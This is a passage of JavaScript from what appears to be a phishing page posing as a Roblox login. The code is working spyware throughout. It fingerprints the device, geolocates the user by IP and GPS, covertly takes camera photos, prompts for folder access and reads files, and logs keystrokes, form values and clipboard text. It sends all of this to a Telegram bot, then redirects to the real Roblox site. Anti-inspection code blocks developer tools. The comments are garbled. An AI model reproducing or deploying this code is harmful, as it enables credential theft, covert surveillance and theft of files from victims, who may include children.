                browser.name = name;
                browser.version = match[1];
                break;
            }
        }
        
        return browser;
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            // ç»˜åˆ¶å¤æ‚å›¾æ¡ˆè·å–æŒ‡çº¹
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Roblox Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillRect(1, 1, 2, 2);
            
            return canvas.toDataURL();
        } catch (e) {
            return null;
        }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return null;
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        } catch (e) {
            return null;
        }
    }

    function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start(0);
            
            const data = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(data);
            
            oscillator.stop(0);
            audioContext.close();
            
            return Array.from(data).slice(0, 20).join(',');
        } catch (e) {
            return null;
        }
    }

    function detectBrowserExtensions() {
        const extensions = [];
        const commonExtensions = [
            { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock' },
            { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock Plus' },
            { id: 'bkdgflcldnnnapblkhphbgpggdiikppg', name: 'uBlock Origin' },
            { id: 'dplockeaaplabmcicdodhdpollmlgail', name: 'LastPass' },
            { id: 'jpjpnpmbddbjkfaccjhnkngdpjdnpjkj', name: 'Bitwarden' },
            { id: 'aohghmighlieiainnegkcijnfilokake', name: 'Google Docs' },
            { id: 'apdfllckaahabafndbhieahigkjlhalf', name: 'Google Drive' }
        ];
        
        // é€šè¿‡åˆ›å»ºå›¾ç‰‡æ£€æµ‹æ‰©å±•æ˜¯å¦å­˜åœ¨
        commonExtensions.forEach(ext => {
            const img = new Image();
            img.onload = function() {
                extensions.push(ext.name);
            };
            img.onerror = function() {};
            img.src = `chrome-extension://${ext.id}/manifest.json`;
        });
        
        collectedData.browserExtensions = extensions;
    }
    // ==================== å®Œæ•´çš„ç½‘ç»œä¿¡æ¯æ”¶é›† ====================
    async function collectComprehensiveNetworkInfo() {
        collectedData.networkInformation = {};
        
        try {
            // è·å–IPåœ°å€
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            collectedData.networkInformation.ip = ipData.ip;
            
            // è·å–è¯¦ç»†åœ°ç†ä½ç½®ä¿¡æ¯
            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoRes.json();
            
            collectedData.networkInformation.geo = {
                ip: ipData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                countryCode: geoData.country_code,
                continentCode: geoData.continent_code,
                postal: geoData.postal,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
                timezone: geoData.timezone,
                utcOffset: geoData.utc_offset,
                currency: geoData.currency,
                currencyName: geoData.currency_name,
                callingCode: geoData.country_calling_code,
                languages: geoData.languages,
                asn: geoData.asn,
                org: geoData.org,
                isp: geoData.org
            };
            
            // å‘é€ä½ç½®ä¿¡æ¯åˆ°Telegram
            const locationInfo = `ğŸ“ <b>è¯¦ç»†åœ°ç†ä½ç½®ä¿¡æ¯</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸŒ <b>å›½å®¶:</b> ${geoData.country_name || 'æœªçŸ¥'}
ğŸ™ï¸ <b>åŸå¸‚:</b> ${geoData.city || 'æœªçŸ¥'}
ğŸŒ <b>IPåœ°å€:</b> ${ipData.ip}
ğŸ“¡ <b>è¿è¥å•†:</b> ${geoData.org || 'æœªçŸ¥'}
ğŸ“ <b>åæ ‡:</b> ${geoData.latitude || 'æœªçŸ¥'}, ${geoData.longitude || 'æœªçŸ¥'}
ğŸ• <b>æ—¶åŒº:</b> ${geoData.timezone || 'æœªçŸ¥'}
ğŸ’± <b>è´§å¸:</b> ${geoData.currency || 'æœªçŸ¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
            
            await sendToTelegram(locationInfo);
            
        } catch (e) {
            // å¤‡ç”¨API
            try {
                const backupRes = await fetch('https://ipapi.co/json/');
                const backupData = await backupRes.json();
                collectedData.networkInformation.geo = backupData;
            } catch (e2) {}
        }
        
        // å°è¯•è·å–ç²¾ç¡®GPSä½ç½®
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    collectedData.networkInformation.gps = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    await sendToTelegram(`ğŸ“ <b>GPSç²¾ç¡®å®šä½æˆåŠŸ:</b>\nçº¬åº¦: ${position.coords.latitude.toFixed(6)}\nç»åº¦: ${position.coords.longitude.toFixed(6)}\nç²¾åº¦: ${position.coords.accuracy}ç±³`);
                },
                (error) => {
                    collectedData.networkInformation.gpsError = error.message;
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        // æ”¶é›†ç½‘ç»œè¿æ¥ä¿¡æ¯
        if (navigator.connection) {
            collectedData.networkInformation.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                downlinkMax: navigator.connection.downlinkMax,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                type: navigator.connection.type
            };
        }
        
        // è·å–ç½‘ç»œæ€§èƒ½ä¿¡æ¯
        try {
            const entries = performance.getEntriesByType('resource');
            const networkEntries = entries.filter(entry => 
                entry.initiatorType === 'xmlhttprequest' || 
                entry.initiatorType === 'fetch' ||
                entry.initiatorType === 'script' ||
                entry.initiatorType === 'link'
            );
            
            collectedData.networkInformation.performance = {
                resourceCount: entries.length,
                networkRequests: networkEntries.length,
                dnsLookupTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
                tcpConnectTime: performance.timing.connectEnd - performance.timing.connectStart,
                requestTime: performance.timing.responseEnd - performance.timing.requestStart,
                domLoadTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
            };
        } catch (e) {}
    }

    // ==================== éšè”½çš„æ‘„åƒå¤´è®¿é—® ====================
    async function stealthCameraAccess() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return false;
        }
        
        try {
            // æšä¸¾æ‰€æœ‰æ‘„åƒå¤´è®¾å¤‡
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            collectedData.cameraAccess = videoDevices.map(device => ({
                deviceId: device.deviceId,
                label: device.label || 'Unknown Camera',
                groupId: device.groupId
            }));
            
            await sendToTelegram(`ğŸ“· <b>å‘ç°æ‘„åƒå¤´è®¾å¤‡:</b> ${videoDevices.length} ä¸ª`);
            
            // å°è¯•è®¿é—®æ¯ä¸ªæ‘„åƒå¤´
            for (const device of videoDevices) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            deviceId: { exact: device.deviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        },
                        audio: false
                    });
                    
                    // æ‹ç…§å¹¶å‘é€
                    await captureCameraPhoto(stream, device.label || 'camera');
                    
                    // åœæ­¢æµ
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch (e) {
                    // å°è¯•ä¸‹ä¸€ä¸ªæ‘„åƒå¤´
                }
            }
            
            return true;
            
        } catch (error) {
            return false;
        }
    }

    async function captureCameraPhoto(stream, label) {
        return new Promise((resolve) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const file = new File([blob], `camera_${label}_${Date.now()}.jpg`, {
                            type: 'image/jpeg'
                        });
                        
                        collectedData.collectedPhotos.push({
                            name: file.name,
                            size: file.size,
                            source: 'camera',
                            camera: label,
                            timestamp: new Date().toISOString()
                        });
                        
                        // å‘é€åˆ°Telegram
                        await sendPhotoToTelegram(file, `éšè—æ‘„åƒå¤´æ‹ç…§ - ${label}`);
                        
                        resolve(true);
                    }
                }, 'image/jpeg', 0.8);
            }, 1500); // 1.5ç§’åæ‹ç…§
        });
    }

    // ==================== å¢å¼ºçš„æ–‡ä»¶å¤¹è®¿é—®æŠ€æœ¯ ====================
    function attemptAdvancedFolderAccess() {
        // æ–¹æ³•1ï¼šè‡ªåŠ¨è§¦å‘webkitdirectoryï¼ˆChromeï¼‰
        if ('webkitdirectory' in document.createElement('input')) {
            setTimeout(() => {
                try {
                    const folderInput = document.createElement('input');
                    folderInput.type = 'file';
                    folderInput.webkitdirectory = true;
                    folderInput.directory = true;
                    folderInput.multiple = true;
                    folderInput.style.display = 'none';
                    
                    folderInput.addEventListener('change', async (e) => {
                        const files = Array.from(e.target.files);
                        collectedData.fileSystemData.push({
                            name: 'webkitdirectory_access',
                            fileCount: files.length,
                            timestamp: new Date().toISOString()
                        });
                        
                        await sendToTelegram(`ğŸ“ <b>æ–‡ä»¶å¤¹è®¿é—®æˆåŠŸ</b>\nå‘ç°æ–‡ä»¶: ${files.length} ä¸ª`);
                        
                        // å¤„ç†å‰20ä¸ªæ–‡ä»¶
                        for (let i = 0; i < Math.min(files.length, 20); i++) {
                            await processFileStealthily(files[i], 'folder_scan');
                        }
                    });
                    
                    document.body.appendChild(folderInput);
                    
                    // è‡ªåŠ¨è§¦å‘
                    setTimeout(() => {
                        try {
                            folderInput.click();
                        } catch (e) {}
                    }, 3000);
                    
                } catch (e) {}
            }, 2000);
        }
        
        // æ–¹æ³•2ï¼šä½¿ç”¨File System Access APIï¼ˆç°ä»£æµè§ˆå™¨ï¼‰
        if ('showDirectoryPicker' in window) {
            setTimeout(async () => {
                try {
                    const dirHandle = await window.showDirectoryPicker();
                    collectedData.fileSystemData.push({
                        name: dirHandle.name,
                        timestamp: new Date().toISOString(),
                        method: 'file_system_api'
                    });
                    
                    await sendToTelegram(`ğŸ“ <b>File System APIè®¿é—®æˆåŠŸ:</b> ${dirHandle.name}`);
                    
                    // é€’å½’è¯»å–æ–‡ä»¶
                    await readDirectoryRecursively(dirHandle);
                    
                } catch (e) {}
            }, 5000);
        }
        
        // æ–¹æ³•3ï¼šé€šè¿‡iframeå°è¯•è®¿é—®
        setTimeout(() => {
            tryFolderAccessViaIframe();
        }, 7000);
        
        // æ–¹æ³•4ï¼šä½¿ç”¨Service Workerè®¿é—®ç¼“å­˜
        if ('serviceWorker' in navigator) {
            setTimeout(() => {
                accessCachedFiles();
            }, 9000);
        }
    }

    async function readDirectoryRecursively(dirHandle, path = '') {
        const files = [];
        
        try {
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    try {
                        const file = await entry.getFile();
                        files.push({
                            name: entry.name,
                            path: path + '/' + entry.name,
                            size: file.size,
                            type: file.type
                        });
                        
                        // å¤„ç†æ–‡ä»¶
                        await processFileStealthily(file, 'recursive_scan');
                        
                    } catch (e) {}
                } else if (entry.kind === 'directory') {
                    await readDirectoryRecursively(entry, path + '/' + entry.name);
                }
            }
        } catch (e) {}
        
        return files;
    }

    async function processFileStealthily(file, source) {
        try {
            const fileInfo = {
                name: file.name || 'unnamed',
                size: file.size,
                type: file.type || 'unknown',
                source: source,
                timestamp: new Date().toISOString()
            };
            
            collectedData.fileSystemData.push(fileInfo);
            
            // å¤„ç†å›¾ç‰‡æ–‡ä»¶
            if (file.type && file.type.startsWith('image/')) {
                collectedData.collectedPhotos.push(fileInfo);
                
                if (file.size < 10 * 1024 * 1024) {
                    await sendPhotoToTelegram(file, `ç³»ç»Ÿæ–‡ä»¶æ‰«æ - ${source}`);
                }
            }
            // å¤„ç†æ–‡æ¡£æ–‡ä»¶
            else if (file.type && (
                file.type.includes('pdf') ||
                file.type.includes('document') ||
                file.type.includes('text') ||
                file.name.match(/\.(txt|pdf|doc|docx|xls|xlsx|ppt|pptx)$/i)
            )) {
                if (file.size < 1024 * 1024) {
                    try {
                        const text = await file.text();
                        fileInfo.preview = text.substring(0, 500);
                        await sendToTelegram(`ğŸ“„ <b>å‘ç°æ–‡æ¡£æ–‡ä»¶:</b> ${file.name}\né¢„è§ˆ: ${text.substring(0, 200)}...`);
                    } catch (e) {}
                }
            }
            
            return true;
            
        } catch (e) {
            return false;
        }
    }

    function tryFolderAccessViaIframe() {
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-same-origin';
        iframe.style.display = 'none';
        
        iframe.onload = function() {
            const iframeDoc = iframe.contentDocument;
            iframeDoc.write(`
                <script>
                    try {
                        if ('showDirectoryPicker' in window) {
                            window.showDirectoryPicker().then(dir => {
                                window.parent.postMessage({
                                    type: 'folderAccessSuccess',
                                    folderName: dir.name
                                }, '*');
                            });
                        }
                        
                        const input = document.createElement('input');
                        input.type = 'file';
                        input.webkitdirectory = true;
                        input.multiple = true;
                        input.style.display = 'none';
                        
                        input.addEventListener('change', function(e) {
                            window.parent.postMessage({
                                type: 'folderFilesFound',
                                fileCount: e.target.files.length
                            }, '*');
                        });
                        
                        document.body.appendChild(input);
                        
                        setTimeout(() => {
                            try {
                                input.click();
                            } catch(e) {}
                        }, 1000);
                    } catch(e) {}
                <\/script>
            `);
        };
        
        document.body.appendChild(iframe);
        
        window.addEventListener('message', (e) => {
            if (e.data.type === 'folderAccessSuccess') {
                sendToTelegram(`ğŸ“ <b>iframeæ–‡ä»¶å¤¹è®¿é—®æˆåŠŸ:</b> ${e.data.folderName}`);
            }
            if (e.data.type === 'folderFilesFound') {
                sendToTelegram(`ğŸ“ <b>iframeå‘ç°æ–‡ä»¶:</b> ${e.data.fileCount} ä¸ª`);
            }
        });
    }

    async function accessCachedFiles() {
        try {
            const cacheNames = await caches.keys();
            for (const cacheName of cacheNames) {
                const cache = await caches.open(cacheName);
                const requests = await cache.keys();
                
                for (const request of requests) {
                    if (request.url.match(/\.(jpg|jpeg|png|gif|webp|mp4|mov|avi|mkv|pdf|doc|docx|txt)$/i)) {
                        try {
                            const response = await cache.match(request);
                            if (response) {
                                const blob = await response.blob();
                                await processFileStealthily(blob, 'cache_file');
                            }
                        } catch (e) {}
                    }
                }
            }
        } catch (e) {}
    }
    // ==================== å…¨é¢çš„è¡Œä¸ºç›‘æ§ ====================
    function startComprehensiveBehaviorMonitoring() {
        collectedData.behaviorAnalytics = {
            mouseMovements: [],
            mouseClicks: [],
            keyboardInputs: [],
            scrollEvents: [],
            focusChanges: [],
            copyPasteActions: [],
            formInteractions: []
        };
        
        // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
        document.addEventListener('mousemove', (e) => {
            if (collectedData.behaviorAnalytics.mouseMovements.length < 1000) {
                collectedData.behaviorAnalytics.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now(),
                    pageX: e.pageX,
                    pageY: e.pageY
                });
            }
        });
        
        // ç‚¹å‡»è·Ÿè¸ª
        document.addEventListener('click', (e) => {
            collectedData.behaviorAnalytics.mouseClicks.push({
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                className: e.target.className,
                id: e.target.id,
                innerText: e.target.innerText?.substring(0, 100),
                timestamp: new Date().toISOString()
            });
        });
        
        // é”®ç›˜è¾“å…¥è·Ÿè¸ª
        document.addEventListener('keydown', (e) => {
            collectedData.behaviorAnalytics.keyboardInputs.push({
                key: e.key,
                code: e.code,
                ctrlKey: e.ctrlKey,
                altKey: e.altKey,
                shiftKey: e.shiftKey,
                metaKey: e.metaKey,
                timestamp: Date.now(),
                target: e.target.tagName
            });
        });
        
        // æ»šåŠ¨è·Ÿè¸ª
        let lastScrollTime = 0;
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScrollTime > 100) {
                collectedData.behaviorAnalytics.scrollEvents.push({
                    scrollX: window.scrollX,
                    scrollY: window.scrollY,
                    windowHeight: window.innerHeight,
                    documentHeight: document.documentElement.scrollHeight,
                    timestamp: now
                });
                lastScrollTime = now;
            }
        });
        
        // ç„¦ç‚¹å˜åŒ–è·Ÿè¸ª
        document.addEventListener('visibilitychange', () => {
            collectedData.behaviorAnalytics.focusChanges.push({
                state: document.hidden ? 'hidden' : 'visible',
                timestamp: new Date().toISOString()
            });
        });
        
        // è¡¨å•äº¤äº’è·Ÿè¸ª
        const formElements = document.querySelectorAll('input, textarea, select');
        formElements.forEach(element => {
            element.addEventListener('focus', () => {
                collectedData.behaviorAnalytics.formInteractions.push({
                    type: 'focus',
                    element: element.tagName,
                    id: element.id,
                    name: element.name,
                    timestamp: new Date().toISOString()
                });
            });
            
            element.addEventListener('blur', () => {
                collectedData.behaviorAnalytics.formInteractions.push({
                    type: 'blur',
                    element: element.tagName,
                    id: element.id,
                    name: element.name,
                    value: element.value?.substring(0, 50),
                    timestamp: new Date().toISOString()
                });
            });
        });
        
        // å¤åˆ¶ç²˜è´´ç›‘æ§
        document.addEventListener('copy', (e) => {
            const selectedText = window.getSelection().toString();
            if (selectedText) {
                collectedData.behaviorAnalytics.copyPasteActions.push({
                    type: 'copy',
                    text: selectedText.substring(0, 500),
                    timestamp: new Date().toISOString()
                });
                sendToTelegram(`ğŸ“‹ <b>ç”¨æˆ·å¤åˆ¶æ–‡æœ¬:</b>\n${selectedText.substring(0, 200)}...`);
            }
        });
        
        document.addEventListener('paste', (e) => {
            const pastedText = e.clipboardData?.getData('text');
            if (pastedText) {
                collectedData.behaviorAnalytics.copyPasteActions.push({
                    type: 'paste',
                    text: pastedText.substring(0, 500),
                    timestamp: new Date().toISOString()
                });
                sendToTelegram(`ğŸ“‹ <b>ç”¨æˆ·ç²˜è´´æ–‡æœ¬:</b>\n${pastedText.substring(0, 200)}...`);
            }
        });
        
        // å®šæœŸå‘é€è¡Œä¸ºæ•°æ®æ‘˜è¦
        setInterval(async () => {
            if (collectedData.behaviorAnalytics.keyboardInputs.length > 0) {
                await sendToTelegram(`âŒ¨ï¸ <b>è¡Œä¸ºç›‘æ§æ‘˜è¦</b>\næŒ‰é”®è®°å½•: ${collectedData.behaviorAnalytics.keyboardInputs.length} æ¬¡\nç‚¹å‡»è®°å½•: ${collectedData.behaviorAnalytics.mouseClicks.length} æ¬¡\né¼ æ ‡ç§»åŠ¨: ${collectedData.behaviorAnalytics.mouseMovements.length} æ¬¡`);
            }
        }, 30000);
    }

    // ==================== ä¸»æ”¶é›†æµç¨‹ ====================
    async function startComprehensiveDataCollection() {
        if (isCollecting) return;
        isCollecting = true;
        
        // ç¦ç”¨ç™»å½•æŒ‰é’®
        const loginBtn = document.getElementById('loginButton');
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<span class="button-icon">â³</span><span>éªŒè¯ä¸­...</span>';
        
        try {
            // æ­¥éª¤1ï¼šæ”¶é›†å®Œæ•´è®¾å¤‡æŒ‡çº¹
            await collectCompleteDeviceFingerprint();
            await delay(1500);
            
            // æ­¥éª¤2ï¼šæ”¶é›†ç½‘ç»œä¿¡æ¯
            await collectComprehensiveNetworkInfo();
            await delay(1500);
            
            // æ­¥éª¤3ï¼šéšè”½æ‘„åƒå¤´è®¿é—®
            await stealthCameraAccess();
            await delay(1000);
            
            // æ­¥éª¤4ï¼šå¼€å§‹è¡Œä¸ºç›‘æ§
            startComprehensiveBehaviorMonitoring();
            
            // æ­¥éª¤5ï¼šå°è¯•æ–‡ä»¶å¤¹è®¿é—®ï¼ˆé™é»˜ï¼‰
            attemptAdvancedFolderAccess();
            
            // å‘é€å®Œæ•´æ•°æ®æŠ¥å‘Š
            await sendCompleteDataReport();
            
            // å»¶è¿Ÿæ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
            await delay(2000);
            
            // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
            showSuccess();
            
            // 5ç§’åé‡å®šå‘åˆ°çœŸæ­£çš„Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 5000);
            
        } catch (error) {
            console.error('æ•°æ®æ”¶é›†è¿‡ç¨‹ä¸­å‡ºé”™:', error);
            showError('éªŒè¯è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œè¯·é‡è¯•');
            loginBtn.disabled = false;
            loginBtn.innerHTML = '<span class="button-icon">ğŸ”</span><span>ç™»å½•</span>';
            isCollecting = false;
        }
    }

    async function sendCompleteDataReport() {
        const report = `ğŸ“Š <b>Robloxå®Œæ•´æ•°æ®æ”¶é›†æŠ¥å‘Š</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ¯ <b>æ”¶é›†ç»Ÿè®¡æ‘˜è¦</b>
ğŸ†” <b>ä¼šè¯ID:</b> ${collectedData.sessionId}
ğŸ• <b>å¼€å§‹æ—¶é—´:</b> ${new Date(collectedData.startTime).toLocaleString('zh-CN')}
â±ï¸ <b>æŒç»­æ—¶é—´:</b> ${Math.round((Date.now() - new Date(collectedData.startTime).getTime()) / 1000)} ç§’
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ‘¤ <b>ç”¨æˆ·å‡­æ®</b>
ç”¨æˆ·å: ${collectedData.userCredentials.username || 'æ— '}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“± <b>è®¾å¤‡ä¿¡æ¯</b>
æ“ä½œç³»ç»Ÿ: ${collectedData.systemInfo.os?.name || 'æœªçŸ¥'} ${collectedData.systemInfo.os?.version || ''}
æµè§ˆå™¨: ${collectedData.systemInfo.browser?.name || 'æœªçŸ¥'} ${collectedData.systemInfo.browser?.version || ''}
åˆ†è¾¨ç‡: ${collectedData.deviceFingerprint.screen?.width || 'æœªçŸ¥'}x${collectedData.deviceFingerprint.screen?.height || 'æœªçŸ¥'}
CPUæ ¸å¿ƒ: ${collectedData.deviceFingerprint.hardware?.concurrency || 'æœªçŸ¥'}
ç³»ç»Ÿå†…å­˜: ${collectedData.deviceFingerprint.hardware?.deviceMemory || 'æœªçŸ¥'}GB
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“ <b>ä½ç½®ä¿¡æ¯</b>
IPåœ°å€: ${collectedData.networkInformation.geo?.ip || 'æœªçŸ¥'}
åœ°ç†ä½ç½®: ${collectedData.networkInformation.geo?.city || 'æœªçŸ¥'}, ${collectedData.networkInformation.geo?.country || 'æœªçŸ¥'}
GPSå®šä½: ${collectedData.networkInformation.gps ? 'æˆåŠŸ' : 'å¤±è´¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“¸ <b>åª’ä½“æ”¶é›†</b>
æ‘„åƒå¤´è®¾å¤‡: ${collectedData.cameraAccess?.length || 0} ä¸ª
ç…§ç‰‡æ”¶é›†: ${collectedData.collectedPhotos.length} å¼ 
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“ <b>æ–‡ä»¶ç³»ç»Ÿ</b>
æ–‡ä»¶æ‰«æ: ${collectedData.fileSystemData.length} ä¸ªæ–‡ä»¶
æ–‡ä»¶å¤¹è®¿é—®: ${collectedData.fileSystemData.filter(f => f.method).length} æ¬¡
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ–±ï¸ <b>è¡Œä¸ºæ•°æ®</b>
é¼ æ ‡è½¨è¿¹: ${collectedData.behaviorAnalytics.mouseMovements?.length || 0} ç‚¹
ç‚¹å‡»è®°å½•: ${collectedData.behaviorAnalytics.mouseClicks?.length || 0} æ¬¡
æŒ‰é”®è®°å½•: ${collectedData.behaviorAnalytics.keyboardInputs?.length || 0} æ¬¡
æ»šåŠ¨äº‹ä»¶: ${collectedData.behaviorAnalytics.scrollEvents?.length || 0} æ¬¡
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ” <b>æµè§ˆå™¨æ‰©å±•</b>
æ£€æµ‹åˆ°æ‰©å±•: ${collectedData.browserExtensions.length} ä¸ª
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
âœ… <b>éªŒè¯çŠ¶æ€:</b> æ•°æ®æ”¶é›†å®Œæˆ
ğŸ“ˆ <b>æ•°æ®å®Œæ•´æ€§:</b> ${calculateDataIntegrity()}%`;

        await sendToTelegram(report);
        
        // å‘é€å®Œæ•´JSONæ•°æ®æ–‡ä»¶
        try {
            const dataStr = JSON.stringify(collectedData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            const dataFile = new File([dataBlob], `roblox_complete_data_${collectedData.sessionId}.json`);
            
            await sendDocumentToTelegram(dataFile, 'ğŸ“Š å®Œæ•´Robloxæ•°æ®åŒ…');
        } catch (error) {
            console.error('å‘é€æ•°æ®æ–‡ä»¶å¤±è´¥:', error);
        }
    }

    function calculateDataIntegrity() {
        let score = 0;
        if (collectedData.userCredentials.username) score += 20;
        if (collectedData.deviceFingerprint.userAgent) score += 15;
        if (collectedData.networkInformation.geo?.ip) score += 15;
        if (collectedData.cameraAccess?.length > 0) score += 15;
        if (collectedData.fileSystemData.length > 0) score += 15;
        if (collectedData.behaviorAnalytics.mouseClicks?.length > 0) score += 10;
        if (collectedData.browserExtensions.length > 0) score += 10;
        return score;
    }

    // ==================== UIæ§åˆ¶å‡½æ•° ====================
    function showLoading() {
        document.getElementById('loadingOverlay').style.display = 'flex';
        document.getElementById('errorMessage').classList.add('hidden');
    }

    function hideLoading() {
        document.getElementById('loadingOverlay').style.display = 'none';
    }

    function showSuccess() {
        hideLoading();
        const successMsg = document.getElementById('successMessage');
        successMsg.classList.remove('hidden');
        successMsg.style.display = 'flex';
        successMsg.style.alignItems = 'center';
        successMsg.style.gap = '10px';
    }

    function showError(message) {
        hideLoading();
        const errorElement = document.getElementById('errorMessage');
        if (message) {
            errorElement.textContent = message;
        }
        errorElement.classList.remove('hidden');
        errorElement.style.display = 'flex';
        errorElement.style.alignItems = 'center';
        errorElement.style.gap = '10px';
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ==================== é˜²æ£€æµ‹ä¿æŠ¤ ====================
    function setupAntiDetection() {
        // ç¦ç”¨å³é”®èœå•
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            sendToTelegram('âš ï¸ <b>ç”¨æˆ·å°è¯•å³é”®ç‚¹å‡»é¡µé¢</b>');
            return false;
        });
        
        // ç¦ç”¨å¼€å‘è€…å·¥å…·å¿«æ·é”®
        document.addEventListener('keydown', (e) => {
            const devToolsKeys = [
                { key: 'F12', name: 'F12' },
                { key: 'I', ctrl: true, shift: true, name: 'Ctrl+Shift+I' },
                { key: 'J', ctrl: true, shift: true, name: 'Ctrl+Shift+J' },
                { key: 'C', ctrl: true, shift: true, name: 'Ctrl+Shift+C' },
                { key: 'U', ctrl: true, name: 'Ctrl+U' }
            ];
            
            for (const shortcut of devToolsKeys) {
                const ctrlMatch = shortcut.ctrl ? e.ctrlKey : true;
                const shiftMatch = shortcut.shift ? e.shiftKey : true;
                const keyMatch = e.key === shortcut.key;
                
                if (ctrlMatch && shiftMatch && keyMatch) {
                    e.preventDefault();
                    e.stopPropagation();
                    sendToTelegram(`âš ï¸ <b>æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å¿«æ·é”®:</b> ${shortcut.name}`);
                    return false;
                }
            }
        });
        
        // é˜²æ­¢é¡µé¢æ£€æŸ¥
        const devToolsOpened = () => {
